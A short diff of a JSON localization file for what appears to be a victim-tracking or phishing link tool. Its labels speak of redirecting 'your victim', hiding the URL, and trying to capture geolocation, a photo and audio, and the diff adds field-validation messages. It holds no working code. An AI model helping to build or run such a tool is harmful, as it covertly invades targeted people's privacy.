@@ -11,10 +11,14 @@
       "your_email": "Your email",
       "redirectUrl": "Redirect URL",
       "redirectUrlExplicit": "Where to redirect your victim",
-      "hideAddress": "Hide URL address",
+      "hideUrl": "Hide URL address",
       "askGeolocation": "Try to get geolocation",
       "askVideo": "Try to take a photo",
       "askAudio": "Try to record an audio"
+    },
+    "validator": {
+      "emptyField": "This field is empty",
+      "wrongPattern": "Value doesn't match field's pattern"
     }
   }
 }
